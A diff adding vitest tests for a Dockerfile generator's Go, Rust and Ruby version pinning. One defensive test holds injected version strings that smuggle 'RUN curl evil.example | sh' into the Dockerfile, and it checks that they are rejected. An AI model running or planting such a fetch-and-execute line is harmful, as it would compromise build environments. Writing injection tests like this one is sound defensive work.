@@ -1,5 +1,9 @@
 import { describe, expect, it } from 'vitest';
 import { renderDockerfile } from '../src/step-engine/steps/env-replicate/02-generate-dockerfile.js';
+import {
+  DEFAULT_GO_VERSION,
+  DEFAULT_RUST_VERSION,
+} from '../src/step-engine/steps/env-replicate/_shared.js';
 import { buildDefaultMcpServers } from '../src/sandbox/mcp-config.js';
 
 describe('renderDockerfile LSP version pins', () => {
@@ -213,6 +217,126 @@ describe('renderDockerfile LSP version pins', () => {
     const unpinned = renderDockerfile('ubuntu:24.04', { browserTesting: true });
     expect(unpinned).toContain('npm install -g chrome-devtools-mcp');
     expect(unpinned).not.toContain('chrome-devtools-mcp@');
+  });
+});
+
+// Go's URL carried a bare `go1.23.0` literal and Rust took `--default-toolchain stable`:
+// opposite failures (frozen vs drifting), one fix -- a recorded default a declared version
+// overrides. See docs/plans/patient-pinning-kernighan.md.
+describe('renderDockerfile runtime version pins', () => {
+  it('installs the declared Go and Rust versions', () => {
+    const df = renderDockerfile('ubuntu:24.04', {
+      runtimes: ['go', 'rust'],
+      versions: { go: '1.24.5', rust: '1.90.0' },
+    } as never);
+    expect(df).toContain('https://go.dev/dl/go1.24.5.linux-amd64.tar.gz');
+    expect(df).toContain('--default-toolchain 1.90.0 --profile minimal');
+    expect(df).not.toContain('--default-toolchain stable');
+  });
+
+  it('falls back to the recorded defaults, never to a floating one', () => {
+    const df = renderDockerfile('ubuntu:24.04', { runtimes: ['go', 'rust'] } as never);
+    expect(df).toContain(`https://go.dev/dl/go${DEFAULT_GO_VERSION}.linux-amd64.tar.gz`);
+    expect(df).toContain(`--default-toolchain ${DEFAULT_RUST_VERSION} --profile minimal`);
+    // The frozen literal and the floating toolchain are both gone.
+    expect(df).not.toContain('go1.23.0');
+    expect(df).not.toContain('--default-toolchain stable');
+    // The fallback is visible in the Dockerfile, not just implied by the URL.
+    expect(df).toContain(`# Go ${DEFAULT_GO_VERSION}`);
+    expect(df).toContain(`# Rust ${DEFAULT_RUST_VERSION}`);
+  });
+
+  // go.mod says `go 1.26`, and go1.26.linux-amd64.tar.gz DOES NOT EXIST -- taking the
+  // declared value verbatim would 404 the build. MEASURED against go.dev 2026-08-23: the
+  // bare X.Y filename stops at 1.20, the X.Y.0 filename starts at 1.21.
+  it('turns a go.mod two-part version into the filename go.dev actually publishes', () => {
+    const modern = renderDockerfile('ubuntu:24.04', {
+      runtimes: ['go'],
+      versions: { go: '1.26' },
+    } as never);
+    expect(modern).toContain('https://go.dev/dl/go1.26.0.linux-amd64.tar.gz');
+
+    // <= 1.20 is the other side of the boundary: there the bare name is the real one.
+    const legacy = renderDockerfile('ubuntu:24.04', {
+      runtimes: ['go'],
+      versions: { go: '1.20' },
+    } as never);
+    expect(legacy).toContain('https://go.dev/dl/go1.20.linux-amd64.tar.gz');
+
+    // A declared patch version is passed through untouched.
+    const patched = renderDockerfile('ubuntu:24.04', {
+      runtimes: ['go'],
+      versions: { go: 'go1.24.3' },
+    } as never);
+    expect(patched).toContain('https://go.dev/dl/go1.24.3.linux-amd64.tar.gz');
+  });
+
+  it('falls back rather than rendering a URL from an unusable Go version', () => {
+    const df = renderDockerfile('ubuntu:24.04', {
+      runtimes: ['go'],
+      versions: { go: '>=1' },
+    } as never);
+    expect(df).toContain(`https://go.dev/dl/go${DEFAULT_GO_VERSION}.linux-amd64.tar.gz`);
+  });
+
+  // rustup resolves a two-part toolchain name (VERIFIED: channel-rust-1.98.toml resolves),
+  // so a Cargo.toml `rust-version = "1.90"` needs no normalising.
+  it('passes a two-part Rust version straight to rustup', () => {
+    const df = renderDockerfile('ubuntu:24.04', {
+      runtimes: ['rust'],
+      versions: { rust: '1.90' },
+    } as never);
+    expect(df).toContain('--default-toolchain 1.90 --profile minimal');
+  });
+
+  // Ruby is the one runtime whose declared version this image cannot honour -- apt ships one
+  // interpreter per suite. It must SAY so rather than emit a pin that means nothing.
+  it('records a declared Ruby version without pretending to install it', () => {
+    const df = renderDockerfile('ubuntu:24.04', {
+      runtimes: ['ruby'],
+      versions: { ruby: '3.4.1' },
+    } as never);
+    expect(df).toContain('declared 3.4.1');
+    expect(df).toContain('NOT honoured');
+    // Still the plain apt install -- no invented package name that no suite carries.
+    expect(df).toContain('apt-get install -y --no-install-recommends ruby ruby-dev');
+    expect(df).not.toContain('ruby3.4');
+
+    const undeclared = renderDockerfile('ubuntu:24.04', { runtimes: ['ruby'] } as never);
+    expect(undeclared).toContain('# Ruby (whatever the base suite ships)');
+  });
+
+  // These versions default to a REPO-DERIVED capture (Cargo.toml `rust-version`, a Gemfile's
+  // `ruby '...'`), and a JS negated class matches a newline -- so a crafted file can close
+  // the quote a line later and carry its own RUN into the generated Dockerfile.
+  it('never lets a repo-supplied version escape its line', () => {
+    const df = renderDockerfile('ubuntu:24.04', {
+      runtimes: ['rust', 'ruby', 'go'],
+      versions: {
+        rust: '1.90\nRUN curl evil.example | sh',
+        ruby: '3.4\nRUN curl evil.example | sh',
+        go: '1.24\nRUN curl evil.example | sh',
+      },
+    } as never);
+    expect(df).not.toContain('evil.example');
+    // Each falls back to something buildable rather than failing open.
+    expect(df).toContain(`--default-toolchain ${DEFAULT_RUST_VERSION} --profile minimal`);
+    expect(df).toContain(`https://go.dev/dl/go${DEFAULT_GO_VERSION}.linux-amd64.tar.gz`);
+    expect(df).toContain('# Ruby (whatever the base suite ships)');
+  });
+
+  // declaredDeps is folded into envTemplateHash, so a project declaring none of these must
+  // render byte-identically to how it rendered before the fields existed -- otherwise every
+  // environment forks a template row and rebuilds its image for no change.
+  it('renders identically when go/rust/ruby are absent vs explicitly null', () => {
+    const base = { runtimes: ['node', 'php'], versions: { node: '22', php: '8.3' } };
+    const withNulls = {
+      runtimes: ['node', 'php'],
+      versions: { node: '22', php: '8.3', go: null, rust: null, ruby: null },
+    };
+    expect(renderDockerfile('ubuntu:24.04', withNulls as never)).toBe(
+      renderDockerfile('ubuntu:24.04', base as never),
+    );
   });
 });
 
